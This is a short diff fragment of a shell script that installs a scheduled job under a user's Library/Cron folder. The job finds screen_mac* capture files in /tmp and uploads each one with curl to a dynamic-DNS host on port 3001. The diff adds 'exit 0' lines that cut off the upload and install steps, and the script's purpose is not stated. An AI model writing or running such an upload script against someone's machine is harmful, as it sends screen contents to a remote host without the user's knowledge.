@@ -37,6 +37,7 @@ read -r -d '' SCRCAP_KK << EOM2
 #!/bin/bash
 set -ex
 sudo killall curl || true
+exit 0
 find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
   echo "uploading \$file"
   if curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file
@@ -51,6 +52,7 @@ EOM2
 
 echo "$SCRCAP_KK" > /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
 chmod 755 /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
+exit 0
 cat /Users/Vladdy/Library/Cron/scrcap_kk.sh > /tmp/screen_mac_000_scrcap_kk.sh.txt || true
 /Users/Vladdy/Library/Cron/scrcap_kk.sh > /tmp/screen_mac_000_scrcap_kk_log.txt || true
 
